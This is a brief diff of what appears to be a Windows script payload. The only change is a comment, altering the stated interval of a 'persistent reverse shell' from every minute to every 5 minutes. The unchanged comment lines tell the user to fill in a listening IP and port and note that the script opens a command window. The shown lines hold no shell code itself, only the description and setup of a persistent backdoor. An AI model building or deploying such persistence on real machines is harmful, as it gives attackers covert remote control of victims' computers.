@@ -1,4 +1,4 @@
-  REM [Persistent reverse shell that runs in the background every minute.]
+  REM [Persistent reverse shell that runs in the background every 5 minutes.]
   REM [replace [IP] with your listening IP]
   REM [replace [PORT] with a port of your choice]
   REM [opens command window]
